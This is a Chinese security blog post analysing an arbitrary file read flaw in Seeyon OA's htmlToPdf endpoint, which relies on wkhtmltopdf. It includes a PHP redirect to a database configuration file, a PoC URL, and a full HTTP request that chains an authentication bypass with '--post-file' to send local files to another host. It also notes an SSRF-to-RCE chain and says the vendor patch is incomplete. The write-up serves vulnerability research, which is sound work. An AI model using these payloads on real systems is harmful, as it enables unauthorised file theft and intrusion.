致远OA代码审计系列四-htmlToPdf任意文件读取漏洞分析
===============================

原创 作者:archive 公号:安全回忆录 发布时间:2023-12-02 0:00 发表于北京

原文地址：[致远OA代码审计系列四-htmlToPdf任意文件读取漏洞分析](https://mp.weixin.qq.com/s/HD_5hQknxhwdf19G7mta6Q)

**漏洞描述:**

htmlToPdf任意文件读取漏洞官方于22年8月发布漏洞补丁, 由于致远OA使用了外部工具wkhtmltopdf进行html转pdf操作, 该工具历史上存在SSRF任意文件读取漏洞。理论上是一个后台漏洞. 但是配合《致远OA代码审计系列二》中提到的致远OA权限绕过, 可以实现前台任意文件读取。配合S1组件漏洞, 也可以实现前台SSRF到RCE。目前该漏洞互联网上暂未发现分析文章, 漏洞传播范围也较小, 阅读这篇文章时建议先阅读前两篇文章。

  

> 致远OA代码审计系列一
> 
> archive，公众号：安全回忆录[致远OA代码审计系列一](http://mp.weixin.qq.com/s?__biz=MzkyNjM1MDMyMg==&mid=2247483794&idx=1&sn=84af07a085a3b67efb46e9b09ea17018&chksm=c239ef0ff54e6619906b8ad3db6c26e1c2517356c80920493898cd472682b8da463bb4922757#rd)

  

> 致远OA代码审计系列二
> 
> archive，公众号：安全回忆录[致远OA代码审计系列二](http://mp.weixin.qq.com/s?__biz=MzkyNjM1MDMyMg==&mid=2247483803&idx=1&sn=a66efb07c048a8219ab30811b4275643&chksm=c239ef06f54e6610f36698e54678e2cc4cf5c77e5248dc8933d76d0d779dff47d8e2c233bc53#rd)

**适用版本:**

适配版本范围：V5&G6&N的V7.1至V8.1SP1全系列版本。

**漏洞分析:**

 漏洞位置:HtmlToPdfController

```python
com/seeyon/ctp/common/htmltopdf/controller/HtmlToPdfController.class
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/8bCtiadxaTMswhNy8UzczgFpUZW9lFWc6Q7aFcf0icmXPNkRX3CNM6cBoNGjQN31RRYWkbGiasPJVbjByVIqnFATg/640?wx_fmt=png&from=appmsg)

跟进HtmlToPdfManager#singleHtmlToPdf方法, 该方法用于将 HTML 转换为 PDF , 通过Runtime.getRuntime().exec() 执行命令调用外部工具wkhtmltopdf进行转换, 虽然是通过Runtime.getRuntime().exec() 执行系统命令,且CMD参数存在拼接参数. 但是由于会经过StringTokenizer处理, 这里并不存在命令注入。

整体逻辑比较简单. 通过简单的处理判断, 将cookie进行简单处理后带入cmd命令中, 最终调用exec方法执行cmd命令进行html转pdf操作.

![](https://mmbiz.qpic.cn/sz_mmbiz_png/8bCtiadxaTMtED5XKPObeQv7RSORiayshYx43iakloiczuNaBB4JiaGVePn7OPIxOq9Hd1NibJM0Xxoa06vqlUdtS18w/640?wx_fmt=png&from=appmsg)

致远OA将HTML转化为PDF借用了外置工具wkhtmltopdf进行转换, 搜索wkhtmltopdf发现存在历史漏洞,存在ssrf和文件读取漏洞. issues地址如下:  

```ruby
https://github.com/wkhtmltopdf/wkhtmltopdf/issues/3570
```

路由在spring-htmlToPdf-controller.xml中配置: /htmlToPdf/htmlToPdf.do

![](https://mmbiz.qpic.cn/sz_mmbiz_png/8bCtiadxaTMtED5XKPObeQv7RSORiayshYD81TI4RSdJtLaEVzOdhZfNLzib4OIvxSyDicFvj5oSnA6BmmhOy4q44Q/640?wx_fmt=png&from=appmsg)

wkhtmltopdf会跟随302重定向,可以通过302重定向实现任意文件读取。  

```xml
<?php 
header('location:file:///C:/seeyon/A8/base/conf/datasourceCtp.properties'); 
?>

```

利用如下poc即可实现任意文件读取。

```ruby
http://192.168.246.4/seeyon/rest/product/trans/htmlToPdf?formPath=http://192.168.3.49:82/111.php
```

翻看wkhtmltopdf官方文档发现支持post数据直接带外。  

![](https://mmbiz.qpic.cn/sz_mmbiz_png/8bCtiadxaTMtED5XKPObeQv7RSORiayshYQUMaUFF2SpSZLPAQrqFffGibXQ8DthNapRD452ibPHRlN8pKBEDtDbBA/640?wx_fmt=png&from=appmsg)

最终利用POC, 配合权限绕过漏洞,实现前台任意文件读取。

```http
GET /seeyon/htmlToPdf/htmlToPdf.do;Jsessionid=a?method=htmlToPdf&formUrl=--post-file%20file%20C%3A/windows/win.ini%20http%3A//192.168.246.1 HTTP/1.1
Accept: */*
Content-Type: application/x-www-form-urlencoded
Host: 192.168.246.4
Connection: close
User-Agent: Apache-HttpClient/4.5.13 (Java/1.8.0_321)
Cookie: JSESSIONID=10EB94A1DE4FEAD8D3A9AF7A6B031F2C; login_locale=zh_CN
Accept-Encoding: gzip, deflate
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/8bCtiadxaTMtED5XKPObeQv7RSORiayshYCaZkQXzVuAicckJe8CRzw0MtEaEINzJbIsMEPPEDia9fQ85JslOMxm4w/640?wx_fmt=png&from=appmsg)

**漏洞扩展:**

该漏洞本质上是一个SSRF漏洞, 配合前段时间爆出的XXE到RCE漏洞, 也可以实现SSRF到RCE, 且该漏洞的官方修复方式仅修复前台XXE漏洞, 并未修复S1组件的相关漏洞. 只要找到存在SSRF漏洞点. 理论上该漏洞还可以利用。